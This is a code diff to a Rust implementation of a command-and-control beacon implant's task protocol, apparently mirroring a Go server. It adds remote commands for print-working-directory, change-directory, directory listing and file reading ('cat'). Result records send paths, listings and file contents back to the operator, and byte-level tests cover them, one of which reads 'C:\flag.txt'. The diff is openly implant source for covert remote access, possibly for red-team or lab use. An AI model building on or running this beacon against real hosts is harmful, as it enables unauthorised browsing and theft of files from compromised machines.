@@ -114,6 +114,15 @@ pub fn extract_payload<'a>(page: &'a [u8], prepend: &[u8], append: &[u8]) -> Opt
 /// Server task pack command ids (native `beacon_agent`, pl_utils.go).
 pub const COMMAND_TERMINATE: u32 = 10;
 pub const COMMAND_PROFILE: u32 = 21;
+pub const COMMAND_PWD: u32 = 4;
+pub const COMMAND_CD: u32 = 8;
+pub const COMMAND_LS: u32 = 14;
+pub const COMMAND_CAT: u32 = 24;
+/// Beacon-side error report: `{COMMAND_ERROR, win32 error code}`.
+pub const COMMAND_ERROR: u32 = 0x1111_FFFF;
+
+/// Longest path the beacon carries (MAX_PATH); one buffer per task.
+pub const PATH_CAP: usize = 260;
 
 /// A parsed server task (the commands the beacon can delimit and execute;
 /// anything else in the pack stops the parse — the server keeps unprocessed
@@ -124,6 +133,47 @@ pub enum Task {
     Sleep { sec: u32, jitter_pct: u32 },
     /// `COMMAND_TERMINATE`: silent exit.
     Terminate,
+    /// `COMMAND_PWD`: current working directory.
+    Pwd,
+    /// `COMMAND_CD` with the target path (ACP bytes).
+    Cd { path_len: u16, path: [u8; PATH_CAP] },
+    /// `COMMAND_LS` with the directory to list.
+    Ls { path_len: u16, path: [u8; PATH_CAP] },
+    /// `COMMAND_CAT` with the file to read.
+    Cat { path_len: u16, path: [u8; PATH_CAP] },
+}
+
+impl Task {
+    pub fn path(&self) -> &[u8] {
+        match self {
+            Task::Cd { path_len, path }
+            | Task::Ls { path_len, path }
+            | Task::Cat { path_len, path } => &path[..*path_len as usize],
+            _ => &[],
+        }
+    }
+}
+
+/// PackArray string argument: `u32 LE length (incl. the NUL) || bytes ||
+/// NUL` (the task-arg encoding — not the BE array wire form).
+fn pack_string(r: &mut Reader) -> Option<(u16, [u8; PATH_CAP])> {
+    let len = r.u32_le()? as usize;
+    if len == 0 || len > PATH_CAP {
+        return None;
+    }
+    let bytes = r.take(len)?;
+    let mut buf = [0u8; PATH_CAP];
+    let mut i = 0;
+    while i < bytes.len() {
+        buf[i] = bytes[i];
+        i += 1;
+    }
+    // Trailing NUL is separator, not data.
+    let mut n = bytes.len();
+    while n > 0 && buf[n - 1] == 0 {
+        n -= 1;
+    }
+    Some((n as u16, buf))
 }
 
 /// Parse one task record `[u32 LE commandId || args || u32 LE taskId]`.
@@ -148,6 +198,19 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
             let _exit_method = r.u32_le()?;
             Task::Terminate
         }
+        COMMAND_PWD => Task::Pwd,
+        COMMAND_CD => {
+            let (path_len, path) = pack_string(r)?;
+            Task::Cd { path_len, path }
+        }
+        COMMAND_LS => {
+            let (path_len, path) = pack_string(r)?;
+            Task::Ls { path_len, path }
+        }
+        COMMAND_CAT => {
+            let (path_len, path) = pack_string(r)?;
+            Task::Cat { path_len, path }
+        }
         _ => return None,
     };
     let id = r.u32_le()?;
@@ -168,6 +231,38 @@ pub fn finish_results(w: &mut Writer) -> bool {
     let total = w.written() as u32;
     w.backfill_u32_be(0, total);
     true
+}
+
+/// Result record header: `u32 BE taskId || u32 BE commandId`.
+pub fn push_result_header(w: &mut Writer, task_id: u32, command_id: u32) -> bool {
+    w.u32(task_id) && w.u32(command_id)
+}
+
+/// Win32 failure report: `COMMAND_ERROR || u32 BE errorCode` — the server
+/// renders `Error [code]: <message>`.
+pub fn push_error_result(w: &mut Writer, task_id: u32, error_code: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_ERROR) && w.u32(error_code)
+}
+
+/// PWD/CD result: `array path` (the new/current working directory).
+pub fn push_path_result(w: &mut Writer, task_id: u32, command_id: u32, path: &[u8]) -> bool {
+    push_result_header(w, task_id, command_id) && w.array(path)
+}
+
+/// CAT result: `array path || array content`.
+pub fn push_cat_result(w: &mut Writer, task_id: u32, path: &[u8], content: &[u8]) -> bool {
+    push_result_header(w, task_id, COMMAND_CAT) && w.array(path) && w.array(content)
+}
+
+/// LS result header: `byte 1 || array rootPath || int count` — the entries
+/// follow as `push_ls_entry` records.
+pub fn push_ls_result_header(w: &mut Writer, task_id: u32, root: &[u8], count: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_LS) && w.u8(1) && w.array(root) && w.u32(count)
+}
+
+/// One LS entry: `byte isDir || long size || int unixDate || array name`.
+pub fn push_ls_entry(w: &mut Writer, is_dir: bool, size: u64, date: u32, name: &[u8]) -> bool {
+    w.u8(u8::from(is_dir)) && w.u64(size) && w.u32(date) && w.array(name)
 }
 
 /// Append the sleep-acknowledgement record the server's ProcessData expects
@@ -340,6 +435,67 @@ mod tests {
         let mut r = Reader::new(&bytes);
         assert_eq!(parse_task(&mut r), Some((Task::Terminate, 1)));
         assert_eq!(r.remaining(), 0);
+    }
+
+    /// File-command task records, byte-pinned against the Go reference
+    /// (PackArray semantics: int u32 LE, string u32 LE len-incl-NUL).
+    #[test]
+    fn parse_task_file_commands_from_go_reference() {
+        // cd "C:\Test", taskId 0x11223344.
+        let cd = hex("0800000008000000433a5c546573740044332211");
+        let mut r = Reader::new(&cd);
+        let (task, id) = parse_task(&mut r).unwrap();
+        assert!(matches!(task, Task::Cd { path_len: 7, .. }));
+        assert_eq!(task.path(), b"C:\\Test");
+        assert_eq!(id, 0x1122_3344);
+        assert_eq!(r.remaining(), 0);
+
+        // pwd, taskId 1.
+        let pwd = hex("0400000001000000");
+        let mut r = Reader::new(&pwd);
+        assert_eq!(parse_task(&mut r), Some((Task::Pwd, 1)));
+        assert_eq!(r.remaining(), 0);
+
+        // cat "C:\flag.txt", taskId 7.
+        let cat = hex("180000000c000000433a5c666c61672e7478740007000000");
+        let mut r = Reader::new(&cat);
+        let (task, id) = parse_task(&mut r).unwrap();
+        assert!(matches!(task, Task::Cat { path_len: 11, .. }));
+        assert_eq!(task.path(), b"C:\\flag.txt");
+        assert_eq!(id, 7);
+        assert_eq!(r.remaining(), 0);
+    }
+
+    /// Result records the server's ProcessData parses (BE arrays/ints).
+    #[test]
+    fn result_records_match_native_processdata_layout() {
+        // pwd result: taskId 1 || COMMAND_PWD || array "C:\Test".
+        let mut buf = [0u8; 64];
+        let mut w = Writer::new(&mut buf);
+        assert!(push_path_result(&mut w, 1, COMMAND_PWD, b"C:\\Test"));
+        let expected = hex("000000010000000400000007433a5c54657374");
+        assert_eq!(&w.written_bytes()[..expected.len()], &expected[..]);
+
+        // error result: taskId 2 || COMMAND_ERROR || code 5 (access denied).
+        let mut ebuf = [0u8; 64];
+        let mut w = Writer::new(&mut ebuf);
+        assert!(push_error_result(&mut w, 2, 5));
+        let expected = hex("000000021111ffff00000005");
+        assert_eq!(&w.written_bytes()[..expected.len()], &expected[..]);
+
+        // ls result: taskId 3 || COMMAND_LS || 1 || array root || count 1
+        // || entry(dir, 0, 42, "tmp").
+        let mut lbuf = [0u8; 128];
+        let mut w = Writer::new(&mut lbuf);
+        assert!(push_ls_result_header(&mut w, 3, b"C:\\t", 1));
+        assert!(push_ls_entry(&mut w, true, 0, 42, b"tmp"));
+        let expected =
+            hex("000000030000000e0100000004433a5c74000000010100000000000000000000002a00000003");
+        let got = w.written_bytes();
+        // The prefix pins the layout up to the entry name.
+        assert_eq!(&got[..expected.len()], &expected[..]);
+        assert_eq!(&got[expected.len()..expected.len() + 3], b"tmp");
+        assert_eq!(got.len(), expected.len() + 3);
     }
 
     #[test]
